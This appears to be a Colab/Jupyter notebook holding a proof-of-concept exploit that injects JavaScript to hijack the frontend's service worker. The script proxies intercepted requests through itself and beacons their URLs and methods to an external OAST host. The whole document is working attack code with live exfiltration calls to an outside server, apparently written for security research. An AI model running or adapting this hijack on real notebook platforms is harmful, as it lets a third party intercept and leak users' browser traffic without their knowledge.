# Service Worker Hijack Verification

**Run the cell below.** It will inject the hijack and then send a test HTTP request.
Check your Oast server for `START`, `SW_HIJACKED`, and `FETCH` beacons.

In [ ]:
from IPython.display import display, Javascript
import requests
import time

# Inject the service worker hijack (JavaScript auto-executes when cell runs)
display(Javascript("\n(function() {\n    const OAST = 'https://3lpv9gwt1zmwxwbu5hnbw0ckdutp48vv8.oast.site';\n    new Image().src = OAST + '/START';\n\n    let hijackActive = false;\n\n    function addGreenDot() {\n        let dot = document.getElementById('sw-dot');\n        if (!dot) {\n            dot = document.createElement('div');\n            dot.id = 'sw-dot';\n            dot.style.cssText = 'position:fixed;bottom:10px;right:10px;width:12px;height:12px;background:#0f0;border-radius:50%;z-index:999999;';\n            document.body.appendChild(dot);\n        }\n    }\n\n    function hijack() {\n        if (!navigator.serviceWorker) {\n            new Image().src = OAST + '/ERROR?msg=no_sw';\n            return;\n        }\n        navigator.serviceWorker.ready.then(reg => {\n            const sw = reg.active;\n            if (!sw) {\n                setTimeout(hijack, 500);\n                return;\n            }\n            const channel = new MessageChannel();\n            const myPort = channel.port1;\n            const swPort = channel.port2;\n\n            myPort.onmessage = async (e) => {\n                const d = e.data;\n                if (d.action !== 'fetch') return;\n                new Image().src = OAST + '/FETCH?url=' + encodeURIComponent(d.url) + '&method=' + d.method;\n                try {\n                    const res = await fetch(d.url, { method: d.method, headers: d.headers, body: d.body });\n                    const data = await res.arrayBuffer();\n                    const headers = {};\n                    for (let [k,v] of res.headers.entries()) headers[k] = v;\n                    myPort.postMessage({\n                        action: 'response',\n                        responseId: d.requestId,\n                        response: { status: res.status, statusText: res.statusText, headers: headers, data: data }\n                    });\n                } catch(err) {\n                    myPort.postMessage({\n                        action: 'response',\n                        responseId: d.requestId,\n                        error: err.toString()\n                    });\n                }\n            };\n\n            sw.postMessage({ action: 'configure_proxy', serviceWorkerPort: swPort }, [swPort]);\n            hijackActive = true;\n            addGreenDot();\n            console.log('%c\u2705 SW hijacked', 'color:green');\n            new Image().src = OAST + '/SW_HIJACKED';\n        }).catch(e => new Image().src = OAST + '/ERROR?msg=' + encodeURIComponent(e.toString()));\n    }\n\n    hijack();\n})();\n"))
print('✅ Hijack script injected. Waiting 2 seconds for service worker to activate...')
time.sleep(2)

# Make a test request – this will be intercepted if the hijack works
print('📡 Sending test request to https://httpbin.org/get...')
r = requests.get('https://httpbin.org/get', params={'verify': 'colab_sw_hijack'})
print(f'Response status: {r.status_code}')
print('✅ Test completed. Check your Oast server for /FETCH beacon with this request.\n')
print('If you see /FETCH?url=https://httpbin.org/get... then the hijack succeeded.')
